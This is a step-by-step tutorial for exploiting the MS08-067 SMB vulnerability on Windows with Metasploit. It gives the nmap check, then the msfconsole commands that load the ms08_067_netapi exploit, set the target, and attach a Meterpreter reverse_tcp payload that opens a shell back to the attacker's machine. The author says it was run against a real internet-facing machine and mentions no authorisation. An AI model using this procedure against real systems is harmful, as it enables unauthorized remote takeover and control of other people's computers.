penetration test with Metasploit to SMB protocol in machine running Windows Operating System. 

This test done in 2018 on the windows machine located on internet in the real world and gains the full control of the windows command prompt.

Scenario:

(Good old MS08_067 would be a good place to start)

Description: The servers of Microsoft Windows provide support for sharing resources, such as files and print services over a network. This service is vulnerable to remote code execution, and NetAPI32.dll is the cause of this vulnerability.

While windows process a directory traversal (maker) character sequence in path names, there is an error generated in NetAPI32.dll. The vulnerability could be exploited by corrupting stack memory. An example would be sending RPC requests that contain specially crafted (made) path names to the server service component(SRVSVC). The result cause buffer overflow in target memory and finally full access to the command shell of the target machine.

First, identify that the target Windows is vulnerable to MS08-067 or not. Open your terminal and enter the following Nmap command: 
  
  nmap -p445 --script smb-vuln-ms08-067

A)Find IP address of each machine with "ifconfig" in Backtrack and in Windows using "ipconfig".

B)In Backtrack/Kali terminal: 

  1.msfconsole 

  2.use exploit/windows/smb/ms08_067_netapi

Here we are able to see the options of "SMB" exploit by typing this command: 

  3.options 

  4.set rhosts <Target_IP>

C)In the next step we need to set up a listener to handle reverse connection from our exploit(if it's successfully triggered):

  1.set payload windows/meterpreter/reverse_tcp

  2.set lhost <Backtrack_IP>

  3.exploit

Note) during the attack, we are able to trace the exploitation step by step through the wireshark.

After watching "session 1 is open" you succeed to enter the target machine. Now you are in the shell of the target and be able to create/change files and folders.

To exit from "Meterpreter" environment you can type "quit".
